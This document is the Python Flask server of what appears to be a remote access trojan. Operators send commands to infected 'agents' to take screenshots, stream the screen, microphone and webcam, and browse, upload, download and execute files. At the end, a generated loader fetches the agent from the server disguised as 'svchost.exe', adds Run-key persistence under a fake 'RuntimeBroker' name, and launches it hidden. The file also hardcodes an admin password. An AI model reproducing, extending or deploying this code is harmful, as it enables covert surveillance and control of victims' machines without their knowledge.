from flask import Flask, request, jsonify, session, send_from_directory, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from datetime import datetime, timedelta
from functools import wraps
import json
import base64
import os
from models import db, Agent, Command, User, ActivityLog, BannedIP, AgentBuild
from config import Config

app = Flask(__name__)
app.config["TEMPLATES_AUTO_RELOAD"] = True
app.config.from_object(Config)

CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', max_http_buffer_size=10000000)
jwt = JWTManager(app)
db.init_app(app)
from admin_panel import init_admin

# Хранилище активных агентов {agent_id: sid}
active_agents = {}
# Хранилище операторов {sid: user_id}
active_operators = {}

# Initialize Flask-Admin
admin = init_admin(app)
with app.app_context():
    db.create_all()

    # Обновляем старого admin пользователя если он существует
    old_admin = User.query.filter_by(username='admin').first()
    if old_admin:
        print(f"[MIGRATION] Found old admin user, updating to sato...")
        old_admin.username = 'sato'
        old_admin.role = 'admin'
        old_admin.set_password('19254172801')
        db.session.commit()
        print(f"[MIGRATION] Updated admin -> sato with role: {old_admin.role}")

    # Создаём дефолтного пользователя sato если его нет
    sato_user = User.query.filter_by(username='sato').first()
    if not sato_user:
        print("[MIGRATION] Creating new sato user...")
        admin = User(username='sato', role='admin')
        admin.set_password('19254172801')
        db.session.add(admin)
        db.session.commit()
        print(f"[MIGRATION] Created sato user with role: {admin.role}")
    else:
        print(f"[MIGRATION] Sato user exists with role: {sato_user.role}")
        # Убедимся что роль admin
        if sato_user.role != 'admin':
            print(f"[MIGRATION] Fixing sato role from {sato_user.role} to admin")
            sato_user.role = 'admin'
            db.session.commit()

    # Выводим всех пользователей для отладки
    all_users = User.query.all()
    print(f"[MIGRATION] Total users in database: {len(all_users)}")
    for u in all_users:
        print(f"[MIGRATION] User: {u.username}, Role: {u.role}")

# Проверка забаненных IP перед каждым запросом

@app.before_request
def check_banned_ip_middleware():
    return check_banned_ip()

def get_real_ip():
    """Получить реальный IP клиента из заголовков прокси"""
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr

def check_banned_ip():
    # Пропускаем проверку для OPTIONS (CORS preflight), статических файлов и socket.io
    if request.method == 'OPTIONS' or request.path.startswith('/socket.io') or request.path.startswith('/static'):
        return None

    ip_address = get_real_ip()
    banned_ip = BannedIP.query.filter_by(ip_address=ip_address).first()

    if banned_ip:
        return jsonify({'error': 'Access denied', 'banned': True}), 403


@app.after_request
def update_user_activity(response):
    # Обновляем last_activity для JWT-авторизованных пользователей (фронтенд)
    try:
        from flask_jwt_extended import verify_jwt_in_request, get_jwt_identity
        verify_jwt_in_request(optional=True)
        user_id = get_jwt_identity()
        if user_id:
            user = User.query.get(user_id)
            if user:
                user.last_activity = datetime.utcnow()
                db.session.commit()
    except:
        pass
    return response

# ═══════════════════════════════════════════════════════════════
# AUTH ROUTES
# ═══════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('static/assets', filename)

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    ip_address = get_real_ip()

    # Проверяем забанен ли IP
    banned_ip = BannedIP.query.filter_by(ip_address=ip_address).first()
    if banned_ip:
        log = ActivityLog(
            username=username,
            action='login_blocked',
            details=f'Blocked IP: {banned_ip.reason}',
            ip_address=ip_address
        )
        db.session.add(log)
        db.session.commit()
        return jsonify({'error': 'Access denied'}), 403

    user = User.query.filter_by(username=username).first()

    # Проверяем забанен ли пользователь
    if user and user.is_banned:
        log = ActivityLog(
            user_id=user.id,
            username=user.username,
            action='login_blocked',
            details='User is banned',
            ip_address=ip_address
        )
        db.session.add(log)
        db.session.commit()
        return jsonify({'error': 'Account is banned'}), 403

    if user and user.check_password(password):
        access_token = create_access_token(
            identity=str(user.id),
            expires_delta=timedelta(days=7)
        )

        # Логируем успешный вход
        log = ActivityLog(
            user_id=user.id,
            username=user.username,
            action='login',
            details=f'Successful login',
            ip_address=ip_address
        )
        db.session.add(log)
        db.session.commit()

        return jsonify({
            'token': access_token,
            'username': user.username,
            'role': user.role
        }), 200

    # Логируем неудачную попытку входа
    log = ActivityLog(
        username=username,
        action='login_failed',
        details=f'Failed login attempt',
        ip_address=ip_address
    )
    db.session.add(log)
    db.session.commit()

    return jsonify({'error': 'Invalid credentials'}), 401

# ═══════════════════════════════════════════════════════════════
# ROLE CHECK DECORATOR
# ═══════════════════════════════════════════════════════════════

def admin_required(f):
    @wraps(f)
    @jwt_required()
    def decorated_function(*args, **kwargs):
        user_id = int(get_jwt_identity())  # Конвертируем обратно в int
        print(f"[AUTH] admin_required: user_id={user_id}")
        user = User.query.get(user_id)
        if user:
            print(f"[AUTH] Found user: {user.username}, role={user.role}")
        else:
            print(f"[AUTH] User not found for id={user_id}")

        if not user or user.role != 'admin':
            print(f"[AUTH] Access denied: user={user}, role={user.role if user else 'None'}")
            return jsonify({'error': 'Admin access required'}), 403

        print(f"[AUTH] Access granted for {user.username}")
        return f(*args, **kwargs)
    return decorated_function

def user_or_admin_required(f):
    @wraps(f)
    @jwt_required()
    def decorated_function(*args, **kwargs):
        user_id = int(get_jwt_identity())  # Конвертируем обратно в int
        user = User.query.get(user_id)
        if not user or user.role not in ['admin', 'user']:
            return jsonify({'error': 'User or Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function

# ═══════════════════════════════════════════════════════════════
# USER ROUTES
# ═══════════════════════════════════════════════════════════════

@app.route('/api/users', methods=['GET'])
@admin_required
def get_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'username': u.username,
        'role': u.role,
        'created_at': u.created_at.isoformat() if u.created_at else None
    } for u in users]), 200

@app.route('/api/logs', methods=['GET'])
@admin_required
def get_logs():
    limit = request.args.get('limit', 100, type=int)
    logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).limit(limit).all()
    return jsonify([{
        'id': log.id,
        'username': log.username,
        'action': log.action,
        'agent_id': log.agent_id,
        'command': log.command,
        'details': log.details,
        'ip_address': log.ip_address,
        'timestamp': log.timestamp.isoformat() if log.timestamp else None
    } for log in logs]), 200

@app.route('/api/auth-logs', methods=['GET'])
@admin_required
def get_auth_logs():
    limit = request.args.get('limit', 200, type=int)
    logs = ActivityLog.query.filter(
        ActivityLog.action.in_(['login', 'login_failed', 'login_blocked'])
    ).order_by(ActivityLog.timestamp.desc()).limit(limit).all()
    return jsonify([{
        'id': log.id,
        'username': log.username,
        'action': log.action,
        'details': log.details,
        'ip_address': log.ip_address,
        'timestamp': log.timestamp.isoformat() if log.timestamp else None
    } for log in logs]), 200

@app.route('/api/ban-ip', methods=['POST'])
@admin_required
def ban_ip():
    data = request.get_json()
    ip_address = data.get('ip_address')
    reason = data.get('reason', 'No reason provided')

    current_user_id = get_jwt_identity()
    user = User.query.get(int(current_user_id))

    existing = BannedIP.query.filter_by(ip_address=ip_address).first()
    if existing:
        return jsonify({'error': 'IP already banned'}), 400

    banned_ip = BannedIP(
        ip_address=ip_address,
        reason=reason,
        banned_by=user.username
    )
    db.session.add(banned_ip)
    db.session.commit()

    return jsonify({'message': 'IP banned successfully'}), 200

@app.route('/api/unban-ip', methods=['POST'])
@admin_required
def unban_ip():
    data = request.get_json()
    ip_address = data.get('ip_address')

    banned_ip = BannedIP.query.filter_by(ip_address=ip_address).first()
    if not banned_ip:
        return jsonify({'error': 'IP not found'}), 404

    db.session.delete(banned_ip)
    db.session.commit()

    return jsonify({'message': 'IP unbanned successfully'}), 200

@app.route('/api/banned-ips', methods=['GET'])
@admin_required
def get_banned_ips():
    banned = BannedIP.query.all()
    return jsonify([{
        'id': b.id,
        'ip_address': b.ip_address,
        'reason': b.reason,
        'banned_by': b.banned_by,
        'banned_at': b.banned_at.isoformat() if b.banned_at else None
    } for b in banned]), 200

@app.route('/api/users', methods=['POST'])
@admin_required
def create_user():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    role = data.get('role', 'user')

    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400

    if role not in ['admin', 'user', 'viewer']:
        return jsonify({'error': 'Invalid role. Must be: admin, user, or viewer'}), 400

    if User.query.filter_by(username=username).first():
        return jsonify({'error': 'Username already exists'}), 400

    user = User(username=username, role=role)
    user.set_password(password)
    db.session.add(user)
    db.session.commit()

    return jsonify({'id': user.id, 'username': user.username, 'role': user.role}), 201

@app.route('/api/users/<int:user_id>', methods=['DELETE'])
@admin_required
def delete_user(user_id):
    user = User.query.get_or_404(user_id)

    if user.username == 'sato':
        return jsonify({'error': 'Cannot delete sato user'}), 403

    db.session.delete(user)
    db.session.commit()

    return jsonify({'message': 'User deleted'}), 200

@app.route('/api/users/<int:user_id>', methods=['PUT'])
@admin_required
def update_user(user_id):
    user = User.query.get_or_404(user_id)
    data = request.get_json()

    if 'password' in data and data['password']:
        user.set_password(data['password'])

    if 'role' in data:
        if data['role'] not in ['admin', 'operator']:
            return jsonify({'error': 'Invalid role'}), 400
        user.role = data['role']

    db.session.commit()

    return jsonify({'message': 'User updated'}), 200

@app.route('/api/upload-temp', methods=['POST'])
@user_or_admin_required
def upload_temp_file():
    """Временная загрузка файла для fullscreen image."""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    if not file.filename:
        return jsonify({'error': 'No file selected'}), 400

    # Сохраняем во временную директорию
    import tempfile
    temp_dir = tempfile.gettempdir()
    filename = f"temp_image_{datetime.now().timestamp()}_{file.filename}"
    filepath = os.path.join(temp_dir, filename)
    file.save(filepath)

    # Возвращаем путь к файлу
    return jsonify({'url': filepath, 'filename': filename}), 200

# ═══════════════════════════════════════════════════════════════
# AGENT ROUTES
# ═══════════════════════════════════════════════════════════════

@app.route('/api/agents', methods=['GET'])
def get_agents():
    agents = Agent.query.all()
    return jsonify([{
        'id': a.id,
        'hostname': a.hostname,
        'ip': a.ip,
        'os': a.os,
        'username': a.username,
        'status': a.status,
        'last_seen': a.last_seen.isoformat() + 'Z' if a.last_seen else None,
        'connected_at': a.connected_at.isoformat() + 'Z' if a.connected_at else None
    } for a in agents]), 200

@app.route('/api/agents/<int:agent_id>', methods=['GET'])
def get_agent(agent_id):
    agent = Agent.query.get_or_404(agent_id)
    return jsonify({
        'id': agent.id,
        'hostname': agent.hostname,
        'ip': agent.ip,
        'os': agent.os,
        'username': agent.username,
        'status': agent.status,
        'last_seen': agent.last_seen.isoformat() + 'Z' if agent.last_seen else None,
        'connected_at': agent.connected_at.isoformat() + 'Z' if agent.connected_at else None
    }), 200

@app.route('/api/agents/<int:agent_id>/command', methods=['POST'])
@user_or_admin_required
def send_command(agent_id):
    agent = Agent.query.get_or_404(agent_id)
    data = request.get_json()
    command_text = data.get('command')
    params = data.get('params', {})
    file_data = data.get('file_data')
    filename = data.get('filename')

    # Логируем команду
    current_user_id = get_jwt_identity()
    user = User.query.get(int(current_user_id))

    # Красивое название команды
    command_display_names = {
        'screenshot': 'Screenshot',
        'get_apps': 'Get Running Apps',
        'kill_app': 'Kill Application',
        'start_screen_stream': 'Screen Stream',
        'stop_screen_stream': 'Stop Screen Stream',
        'start_microphone_stream': 'Start Microphone',
        'stop_microphone_stream': 'Stop Microphone',
        'start_system_audio_stream': 'Start System Audio',
        'stop_system_audio_stream': 'Stop System Audio',
        'get_monitors': 'Get Monitors',
        'webcam': 'Webcam Capture',
        'browse': 'Browse Files',
        'download': 'Download File',
        'upload': 'Upload File',
        'execute': 'Execute File'
    }

    # Ensure command_text is a string
    if isinstance(command_text, dict) or isinstance(command_text, list):
        import json
        command_text_str = json.dumps(command_text)
    else:
        command_text_str = str(command_text) if command_text else 'unknown_command'
        
    command_name = command_text_str.split()[0] if command_text_str else 'unknown_command'
    display_name = command_display_names.get(command_name, command_text_str)

    log = ActivityLog(
        user_id=user.id if user else None,
        username=user.username if user else 'system',
        action='command',
        agent_id=agent_id,
        command=display_name or 'unknown',
        details=None,
        ip_address=get_real_ip()
    )
    db.session.add(log)
    db.session.commit()

    if agent.id not in active_agents:
        return jsonify({'error': 'Agent offline'}), 400

    # Отправляем команду агенту с параметрами
    socketio.emit('command', {
        'command': command_text or 'unknown',
        'params': params,
        'file_data': file_data,
        'filename': filename
    }, to=active_agents[agent.id])

    # Сохраняем в БД
    cmd = Command(agent_id=agent.id, command=command_text or 'unknown', user_id=int(current_user_id))
    db.session.add(cmd)
    db.session.commit()

    return jsonify({'status': 'sent', 'command_id': cmd.id}), 200

@app.route('/api/agents/<int:agent_id>/upload', methods=['POST'])
@user_or_admin_required
def upload_file(agent_id):
    agent = Agent.query.get_or_404(agent_id)

    if agent.id not in active_agents:
        return jsonify({'error': 'Agent offline'}), 400

    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    destination = request.form.get('path', '')

    if not destination:
        return jsonify({'error': 'No destination path provided'}), 400

    # Читаем файл и кодируем в base64
    file_data = base64.b64encode(file.read()).decode()

    # Отправляем команду агенту
    command_text = f'upload {destination}'
    socketio.emit('command', {
        'command': command_text,
        'file_data': file_data,
        'filename': file.filename
    }, to=active_agents[agent.id])

    # Сохраняем в БД
    cmd = Command(agent_id=agent.id, command=command_text)
    db.session.add(cmd)
    db.session.commit()

    return jsonify({'status': 'sent', 'command_id': cmd.id}), 200

# ═══════════════════════════════════════════════════════════════
# WEBSOCKET HANDLERS - AGENTS
# ═══════════════════════════════════════════════════════════════

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """Агент подключается к серверу."""
    print(f"[AGENT CONNECT] Received: {data}")
    hostname = data.get('hostname')
    ip = data.get('ip')
    os_info = data.get('os')
    username = data.get('username')

    # Ищем существующего агента или создаём нового
    agent = Agent.query.filter_by(hostname=hostname, ip=ip).first()
    if not agent:
        agent = Agent(hostname=hostname, ip=ip, os=os_info, username=username)
        db.session.add(agent)
    else:
        # Обновляем информацию при переподключении
        agent.os = os_info
        agent.username = username

    agent.status = 'online'
    agent.last_seen = datetime.utcnow()
    agent.connected_at = datetime.utcnow()
    db.session.commit()

    # Логируем подключение агента
    activity_log = ActivityLog(
        action='agent_connected',
        agent_id=agent.id,
        details=f'Agent {hostname} ({ip}) connected',
        ip_address=ip
    )
    db.session.add(activity_log)
    db.session.commit()

    print(f"[AGENT CONNECT] Agent #{agent.id} registered: {hostname}")

    # Сохраняем SID агента
    print(f"[DEBUG] Added agent {agent.id} to active_agents with SID: {request.sid}")
    active_agents[agent.id] = request.sid
    join_room(f'agent_{agent.id}')

    # Уведомляем всех операторов
    socketio.emit('agent_online', {
        'id': agent.id,
        'hostname': hostname,
        'ip': ip,
        'os': os_info,
        'username': username,
        'status': 'online',
        'last_seen': agent.last_seen.isoformat() + 'Z'
    }, room='operators')

    emit('connected', {'agent_id': agent.id})

@socketio.on('agent_heartbeat')
def handle_agent_heartbeat(data):
    """Агент отправляет heartbeat."""
    agent_id = data.get('agent_id')
    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = datetime.utcnow()
        agent.status = 'online'
        db.session.commit()

        # Уведомляем всех клиентов об обновлении агента
        update_data = {
            'id': agent.id,
            'last_seen': agent.last_seen.isoformat() + 'Z',
            'status': agent.status
        }
        print(f"[HEARTBEAT] Agent #{agent.id}, emitting agent_updated to operators: {update_data}")
        emit('agent_updated', update_data, room='operators')

@socketio.on('command_result')
def handle_command_result(data):
    """Агент отправляет результат команды."""
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    result = data.get('result')

    print(f"[COMMAND_RESULT] agent_id={agent_id}, command_id={command_id}, result_len={len(str(result)) if result else 0}")

    # Обновляем команду в БД
    cmd = Command.query.get(command_id) if command_id else None
    if cmd:
        cmd.result = result
        cmd.executed_at = datetime.utcnow()
        db.session.commit()

    # Отправляем результат операторам
    print(f"[COMMAND_RESULT] Emitting to 'operators' room, active_operators={len(active_operators)}")
    socketio.emit('command_result', {
        'agent_id': agent_id,
        'command_id': command_id,
        'result': result
    }, room='operators')

@socketio.on('disconnect')
def handle_disconnect():
    """Обработка отключения (агент или оператор)."""
    # Проверяем, это агент или оператор
    agent_id = None
    for aid, sid in active_agents.items():
        if sid == request.sid:
            agent_id = aid
            break

    if agent_id:
        # Агент отключился
        agent = Agent.query.get(agent_id)
        if agent:
            agent.status = 'offline'
            agent.last_seen = datetime.utcnow()
            db.session.commit()

            # Логируем отключение агента
            activity_log = ActivityLog(
                action='agent_disconnected',
                agent_id=agent.id,
                details=f'Agent {agent.hostname} ({agent.ip}) disconnected',
                ip_address=agent.ip
            )
            db.session.add(activity_log)
            db.session.commit()

            # Уведомляем операторов
            socketio.emit('agent_offline', {
                'id': agent_id,
                'last_seen': agent.last_seen.isoformat() + 'Z'
            }, room='operators')

        del active_agents[agent_id]

    # Удаляем из операторов и обновляем last_activity
    if request.sid in active_operators:
        user_id = active_operators[request.sid]
        if user_id:
            user = User.query.get(user_id)
            if user:
                user.last_activity = datetime.utcnow()
                db.session.commit()
        del active_operators[request.sid]

# ═══════════════════════════════════════════════════════════════
# WEBSOCKET HANDLERS - OPERATORS
# ═══════════════════════════════════════════════════════════════

@socketio.on('operator_connect')
def handle_operator_connect(data):
    """Оператор подключается к панели."""
    token = data.get('token')
    user_id = data.get('user_id')

    # Обновляем last_activity при подключении
    if user_id:
        user = User.query.get(user_id)
        if user:
            user.last_activity = datetime.utcnow()
            db.session.commit()

    join_room('operators')
    active_operators[request.sid] = user_id
    print(f"[OPERATOR_CONNECT] sid={request.sid}, user_id={user_id}, token={'yes' if token else 'no'}")
    emit('connected', {'status': 'ok'})

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Пересылаем WebRTC offer от оператора к агенту"""
    agent_id = data.get('agent_id')
    print(f"[WEBRTC] Received offer from operator for agent {agent_id}")

    if agent_id and agent_id in active_agents:
        agent_sid = active_agents[agent_id]
        data['viewer_sid'] = request.sid  # Добавляем SID оператора для ответа
        emit('webrtc_offer', data, room=agent_sid)
        print(f"[WEBRTC] Forwarded offer to agent {agent_id} (sid={agent_sid})")
    else:
        print(f"[WEBRTC] Agent {agent_id} not found or offline")
        emit('webrtc_error', {'error': 'Agent not found'})

@socketio.on('webrtc_answer')
def handle_webrtc_answer(data):
    """Пересылаем WebRTC answer от агента к оператору"""
    target_sid = data.get('target_sid')
    print(f"[WEBRTC] Received answer from agent, forwarding to {target_sid}")

    if target_sid:
        emit('webrtc_answer', data, room=target_sid)
        print(f"[WEBRTC] Forwarded answer to operator (sid={target_sid})")

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice(data):
    """Пересылаем ICE candidates между агентом и оператором"""
    target_sid = data.get('target_sid')
    agent_id = data.get('agent_id')

    if target_sid:
        # Кандидат от агента -> оператору (по target_sid)
        emit('webrtc_ice_candidate', data, room=target_sid)
        print(f"[WEBRTC ICE] Forwarded candidate from agent to operator (sid={target_sid})")
    elif agent_id:
        # Кандидат от оператора -> агенту (по agent_id)
        resolved_id = agent_id
        if agent_id not in active_agents:
            try:
                resolved_id = int(agent_id)
            except (ValueError, TypeError):
                pass

        if resolved_id in active_agents:
            agent_sid = active_agents[resolved_id]
            data['viewer_sid'] = request.sid
            emit('webrtc_ice_candidate', data, room=agent_sid)
            print(f"[WEBRTC ICE] Forwarded candidate from operator to agent {resolved_id} (sid={agent_sid})")
        else:
            print(f"[WEBRTC ICE] Agent {agent_id} not found in active_agents")
    else:
        print(f"[WEBRTC ICE] No target_sid or agent_id in data: {list(data.keys())}")

@socketio.on('webrtc_stream_busy')
def handle_webrtc_stream_busy(data):
    """Пересылаем сообщение о занятом стриме от агента к оператору"""
    viewer_sid = data.get('viewer_sid')
    print(f"[WEBRTC] Stream busy, notifying viewer {viewer_sid}")
    
    if viewer_sid:
        emit('webrtc_stream_busy', {}, room=viewer_sid)
        print(f"[WEBRTC] Sent stream_busy notification to {viewer_sid}")
from builder_api import register_builder_routes
register_builder_routes(app, admin_required)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

# ═══════════════════════════════════════════════════════════════
# AGENT BUILDER API
# ═══════════════════════════════════════════════════════════════

@app.route("/api/builds/<int:build_id>/download", methods=["GET"])
@admin_required
def download_agent(build_id):
    """Скачать скомпилированный агент"""
    build = AgentBuild.query.get_or_404(build_id)
    
    if build.status != "ready":
        return jsonify({"error": "Build not ready"}), 400
    
    if not os.path.exists(build.file_path):
        return jsonify({"error": "File not found"}), 404
    
    return send_file(
        build.file_path,
        as_attachment=True,
        download_name="svchost.exe"
    )


@app.route("/api/builds/<int:build_id>/loader", methods=["GET"])
@admin_required
def download_loader(build_id):
    build = AgentBuild.query.get_or_404(build_id)
    if build.status != "ready":
        return jsonify({"error": "Build not ready"}), 400
    
    loader_code = """import os, sys, urllib.request, subprocess, shutil, winreg
AGENT_URL = "http://{}/api/builds/{}/download"
TARGET_NAME = "svchost.exe"
def get_path():
    try:
        s = os.path.join(os.environ.get("WINDIR","C:\\Windows"),"System32")
        with open(os.path.join(s,"t.tmp"),"w") as f: f.write("t")
        os.remove(os.path.join(s,"t.tmp"))
        return s
    except:
        p = os.path.join(os.environ.get("APPDATA"),"Microsoft","Windows")
        os.makedirs(p, exist_ok=True)
        return p
t = os.path.join(os.environ.get("TEMP"),"a.exe")
urllib.request.urlretrieve(AGENT_URL, t)
d = get_path()
tp = os.path.join(d, TARGET_NAME)
shutil.copy2(t, tp)
try:
    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(k, "RuntimeBroker", 0, winreg.REG_SZ, tp)
    winreg.CloseKey(k)
except: pass
os.remove(t)
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0
subprocess.Popen([tp], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
""".format(request.host, build.id)
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(loader_code)
        loader_path = f.name
    return send_file(loader_path, as_attachment=True, download_name=f"loader_{build.id}.py", mimetype="text/x-python")
